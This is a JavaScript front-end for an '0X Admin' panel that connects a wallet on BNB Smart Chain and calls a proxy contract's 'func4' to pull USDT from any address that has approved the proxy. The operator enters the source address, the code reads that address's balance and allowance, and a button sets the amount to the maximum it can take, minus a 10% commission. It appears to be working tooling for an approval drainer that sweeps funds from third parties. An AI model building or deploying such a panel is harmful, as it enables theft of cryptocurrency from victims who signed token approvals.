// ═══════════════════════════════════════════════════════════════════════
//  0X Admin — App Logic
//  Web3 wallet connect + func4 execution on BSC
// ═══════════════════════════════════════════════════════════════════════

// ─── Config ───────────────────────────────────────────────────────────
const CONFIG = {
  PROXY_ADDRESS: '0x065A08111056F729d5997b53509ff03bD5425B1E',
  USDT_ADDRESS:  '0x55d398326f99059fF775485246999027B3197955',
  USDT_DECIMALS: 18,
  BSC_CHAIN_ID:  '0x38', // 56
  BSC_RPC:       'https://bsc-dataseed1.binance.org/',
  BSC_CHAIN_CONFIG: {
    chainId: '0x38',
    chainName: 'BNB Smart Chain',
    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
    rpcUrls: ['https://bsc-dataseed1.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/']
  }
};

// ─── Contract ABI (only func4) ────────────────────────────────────────
const PROXY_ABI = [
  'function func4(address token, address source, uint256 amount) public',
  'function authorized(address) public view returns (bool)',
  'function owner() public view returns (address)',
  'function commissionWallet() public view returns (address)'
];

// ERC20 ABI for checking allowance/balance
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)'
];

// ─── State ────────────────────────────────────────────────────────────
let provider = null;
let signer = null;
let userAddress = null;
let proxyContract = null;
let usdtContract = null;
let isConnected = false;

// ─── DOM Helpers ──────────────────────────────────────────────────────
const $ = id => document.getElementById(id);

// ─── Toast ────────────────────────────────────────────────────────────
function toast(msg, type = 'info') {
  const el = document.createElement('div');
  el.className = `toast ${type}`;
  el.textContent = msg;
  $('toastWrap').appendChild(el);
  setTimeout(() => {
    el.style.opacity = '0';
    el.style.transition = 'opacity 0.3s';
    setTimeout(() => el.remove(), 300);
  }, 5000);
}

// ─── Connect Wallet ───────────────────────────────────────────────────
async function handleConnect() {
  if (isConnected) {
    // Disconnect
    isConnected = false;
    provider = null; signer = null; userAddress = null;
    proxyContract = null; usdtContract = null;
    $('connectBtn').classList.remove('connected');
    $('connectText').textContent = 'Connect Wallet';
    $('statsBar').style.display = 'none';
    $('execBtn').disabled = true;
    $('execText').textContent = 'Connect Wallet to Continue';
    toast('Wallet disconnected');
    return;
  }

  if (typeof window.ethereum === 'undefined') {
    toast('MetaMask or Web3 wallet not found! Please install MetaMask.', 'error');
    return;
  }

  try {
    // Request accounts
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    userAddress = accounts[0];

    // Check/switch to BSC
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    if (chainId !== CONFIG.BSC_CHAIN_ID) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
        });
      } catch (switchErr) {
        if (switchErr.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [CONFIG.BSC_CHAIN_CONFIG]
          });
        } else {
          throw switchErr;
        }
      }
    }

    // Setup provider & signer
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();

    // Setup contracts
    proxyContract = new ethers.Contract(CONFIG.PROXY_ADDRESS, PROXY_ABI, signer);
    usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, provider);

    isConnected = true;

    // UI update
    $('connectBtn').classList.add('connected');
    $('connectText').textContent = shortAddr(userAddress);

    // Load stats
    await loadStats();

    $('execBtn').disabled = false;
    $('execText').textContent = 'Execute Transfer';

    toast('Wallet connected!', 'success');

    // Listen for account/chain changes
    window.ethereum.on('accountsChanged', handleAccountChange);
    window.ethereum.on('chainChanged', () => window.location.reload());

  } catch (err) {
    console.error(err);
    toast(err.message || 'Connection failed', 'error');
  }
}

async function handleAccountChange(accounts) {
  if (accounts.length === 0) {
    handleConnect(); // disconnect
  } else {
    userAddress = accounts[0];
    $('connectText').textContent = shortAddr(userAddress);
    await loadStats();
  }
}

// ─── Load Stats ───────────────────────────────────────────────────────
async function loadStats() {
  try {
    const [balance, isAuth] = await Promise.all([
      provider.getBalance(userAddress),
      proxyContract.authorized(userAddress)
    ]);

    $('statWallet').textContent = shortAddr(userAddress);
    $('statBNB').textContent = parseFloat(ethers.utils.formatEther(balance)).toFixed(4) + ' BNB';
    $('statContract').textContent = shortAddr(CONFIG.PROXY_ADDRESS);
    $('statAuth').innerHTML = isAuth
      ? '<span style="color:var(--green)">✓ Authorized</span>'
      : '<span style="color:var(--red)">✗ Not Authorized</span>';

    $('statsBar').style.display = 'grid';
  } catch (e) {
    console.error('Stats error:', e);
  }
}

// ─── Sender Address Validation ────────────────────────────────────────
let senderCheckTimeout = null;
$('senderAddr') && $('senderAddr').addEventListener('input', function() {
  clearTimeout(senderCheckTimeout);
  const addr = this.value.trim();
  const hint = $('senderHint');

  if (!addr) { hint.textContent = ''; $('maxBtn').style.display = 'none'; return; }

  if (!ethers.utils.isAddress(addr)) {
    hint.textContent = '✗ Invalid address';
    hint.className = 'field-hint error';
    $('maxBtn').style.display = 'none';
    return;
  }

  hint.textContent = 'Checking...';
  hint.className = 'field-hint';

  senderCheckTimeout = setTimeout(async () => {
    try {
      const [balance, allowance] = await Promise.all([
        usdtContract.balanceOf(addr),
        usdtContract.allowance(addr, CONFIG.PROXY_ADDRESS)
      ]);

      const balFormatted = parseFloat(ethers.utils.formatUnits(balance, CONFIG.USDT_DECIMALS)).toFixed(2);
      const allowFormatted = parseFloat(ethers.utils.formatUnits(allowance, CONFIG.USDT_DECIMALS)).toFixed(2);

      hint.innerHTML = `Balance: <strong>${balFormatted}</strong> USDT · Allowance: <strong>${allowFormatted}</strong> USDT`;
      hint.className = 'field-hint success';

      // Store for MAX button
      hint.dataset.balance = balFormatted;
      hint.dataset.allowance = allowFormatted;
      hint.dataset.rawAllowance = allowance.toString();

      $('maxBtn').style.display = 'block';
    } catch (e) {
      hint.textContent = '✗ Could not fetch balance';
      hint.className = 'field-hint error';
    }
  }, 500);
});

// ─── Paste Sender ─────────────────────────────────────────────────────
async function pasteSender() {
  try {
    const text = await navigator.clipboard.readText();
    $('senderAddr').value = text.trim();
    $('senderAddr').dispatchEvent(new Event('input'));
  } catch (e) {
    toast('Clipboard access denied', 'error');
  }
}

// ─── Set Max Amount ───────────────────────────────────────────────────
function setMaxAmount() {
  const hint = $('senderHint');
  const allowance = hint.dataset.allowance;
  const balance = hint.dataset.balance;
  if (allowance && balance) {
    const max = Math.min(parseFloat(allowance), parseFloat(balance));
    $('amount').value = max.toString();
    updatePreview();
  }
}

// ─── Update Split Preview ─────────────────────────────────────────────
function updatePreview() {
  const val = parseFloat($('amount').value);
  const preview = $('splitPreview');

  if (!val || val <= 0) {
    preview.style.display = 'none';
    return;
  }

  const commission = (val * 10) / 100;
  const yourShare = val - commission;

  $('splitComm').textContent = commission.toFixed(2) + ' USDT';
  $('splitYou').textContent = yourShare.toFixed(2) + ' USDT';
  $('splitTotal').textContent = val.toFixed(2) + ' USDT';

  preview.style.display = 'block';
}

// ─── Execute Transfer (func4) ─────────────────────────────────────────
async function executeTransfer() {
  if (!isConnected) { toast('Connect wallet first', 'error'); return; }

  const sender = $('senderAddr').value.trim();
  const amountStr = $('amount').value.trim();

  // Validate
  if (!sender || !ethers.utils.isAddress(sender)) {
    toast('Enter a valid sender address', 'error');
    return;
  }

  const amountFloat = parseFloat(amountStr);
  if (!amountFloat || amountFloat <= 0) {
    toast('Enter a valid amount', 'error');
    return;
  }

  // Convert to wei (18 decimals for BSC USDT)
  const amountWei = ethers.utils.parseUnits(amountStr, CONFIG.USDT_DECIMALS);

  // UI: loading
  const btn = $('execBtn');
  const btnText = $('execText');
  const loader = $('execLoader');
  btn.classList.add('loading');
  btnText.style.display = 'none';
  loader.style.display = 'flex';

  try {
    toast('Sending transaction...', 'info');

    const tx = await proxyContract.func4(
      CONFIG.USDT_ADDRESS,
      sender,
      amountWei,
      { gasLimit: 500000 }
    );

    toast('Transaction sent! Waiting for confirmation...', 'info');

    const receipt = await tx.wait();

    if (receipt.status === 1) {
      // Success
      addHistory(true, sender, amountStr, receipt.transactionHash);
      showSuccess(amountStr, receipt.transactionHash);
      toast('Transfer executed successfully!', 'success');

      // Clear form
      $('senderAddr').value = '';
      $('amount').value = '';
      $('senderHint').textContent = '';
      $('splitPreview').style.display = 'none';
      $('maxBtn').style.display = 'none';

      // Refresh stats
      await loadStats();
    } else {
      addHistory(false, sender, amountStr, receipt.transactionHash);
      toast('Transaction reverted on chain', 'error');
    }

  } catch (err) {
    console.error('Execute error:', err);
    const reason = err.reason || err.data?.message || err.message || 'Transaction failed';
    addHistory(false, sender, amountStr, null);
    toast(reason, 'error');
  } finally {
    btn.classList.remove('loading');
    btnText.style.display = 'inline';
    loader.style.display = 'none';
  }
}

// ─── Transaction History ──────────────────────────────────────────────
function addHistory(success, sender, amount, txHash) {
  $('historyCard').style.display = 'block';
  const list = $('historyList');

  const item = document.createElement('div');
  item.className = 'history-item';

  const link = txHash
    ? `<a href="https://bscscan.com/tx/${txHash}" target="_blank" class="history-link">View →</a>`
    : '';

  item.innerHTML = `
    <div class="history-icon ${success ? 'success' : 'error'}">${success ? '✓' : '✗'}</div>
    <div class="history-info">
      <div class="history-title">${success ? 'Transfer Executed' : 'Transfer Failed'}</div>
      <div class="history-detail">${shortAddr(sender)} · ${new Date().toLocaleTimeString()}</div>
    </div>
    <div class="history-amount">${amount} USDT</div>
    ${link}
  `;

  list.prepend(item);
}

// ─── Success Overlay ──────────────────────────────────────────────────
function showSuccess(amount, txHash) {
  $('successMsg').textContent = `Successfully transferred ${amount} USDT`;
  $('successLink').href = `https://bscscan.com/tx/${txHash}`;
  $('successOverlay').classList.add('show');
}

function closeSuccess() {
  $('successOverlay').classList.remove('show');
}

// ─── Utils ────────────────────────────────────────────────────────────
function shortAddr(addr) {
  if (!addr) return '—';
  return addr.slice(0, 6) + '...' + addr.slice(-4);
}

// ─── Auto-check wallet on load ────────────────────────────────────────
window.addEventListener('DOMContentLoaded', async () => {
  if (typeof window.ethereum !== 'undefined') {
    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
    if (accounts.length > 0) {
      handleConnect(); // auto-reconnect
    }
  }
});
